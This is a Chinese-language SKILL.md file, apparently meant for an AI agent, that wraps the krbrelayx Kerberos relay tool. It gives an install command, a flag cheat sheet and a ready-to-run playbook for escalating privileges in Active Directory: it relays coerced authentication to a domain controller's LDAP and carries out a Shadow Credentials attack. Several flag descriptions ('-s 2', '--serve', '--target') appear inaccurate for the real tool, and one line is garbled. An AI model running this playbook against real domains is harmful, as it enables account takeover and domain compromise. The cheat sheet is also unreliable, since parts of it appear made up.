---
name: krbrelayx-kerberos-relay
description: 渗透工具 skill:krbrelayx 的安装、参数速查与攻击场景 playbook。当任务涉及 Kerberos与票据攻击 需要调用 krbrelayx 时使用。
---

# krbrelayx

- 攻击大类:C26 Kerberos与票据攻击
- 上游仓库:https://github.com/dirkjanm/krbrelayx
- 上游 License:MIT(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
git clone https://github.com/dirkjanm/krbrelayx && pip install -r requirements.txt
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `python krbrelayx.py -t ldap://dc01` | Kerberos 中继 |
| `--target user@corp.local` | 目标 SPN |
| `-s 2` | Shadow Credentials 攻击 |
| `--serve` | 起恶意 SMB |

## 攻击场景 Playbook

### PrinterBug+Shadow Credentials 提权

```bash
python krbrelayx.py -t ldap://dc01 --target svc$ -s 2
# 配合 PrinterBug/d PetitPotam 触发认证 → 中继到 LDAP 打 Shadow Credentials
```

## 注意事项

dirkjanm 出品;把 NTLM 中继思路搬到 Kerberos,Shadow Credentials 攻击的标配。
